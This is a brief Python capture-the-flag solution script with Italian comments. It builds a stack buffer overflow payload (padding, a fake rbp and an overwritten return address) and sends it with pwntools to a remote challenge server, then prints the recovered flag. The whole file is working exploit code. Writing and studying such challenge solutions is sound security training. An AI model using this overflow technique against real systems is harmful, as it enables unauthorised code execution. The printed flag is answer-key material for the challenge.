#! /usr/bin/env python3

import struct

payload = b'AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFF'

# questo valore funzionava su gdb mio, riuscivo a saltare con successo
# ma non invocava bene il /bin/sh, almeno mi diceva bentornato!
# rbp =  struct.pack('I',0xffffdfe0) + struct.pack('I',0x0007fff)
rbp = b'FGGGGGGG'

# questi valori vanno su rip e fanno saltare
rip = struct.pack('I', 0x00401235)


print(payload + rbp + rip)


from pwn import *

# conn = process('./moreprivateclub')
conn = remote('moreprivateclub.challs.olicyber.it', 10016)
conn.recvuntil('hai?')
conn.sendline('1')
conn.recvuntil('chiami?')
# non mi ricordo perch'e ci ho messo \x00, 
# forse andava oltre 32 bit e comparivano altri bit, cos`i li sovrascrivevo
conn.sendline(payload + rbp + rip + b'\x00')

# ah si perch'e questo programma non covertiva il \n in null 
conn.interactive()

# flag{r3t2wh3r31w4nt}
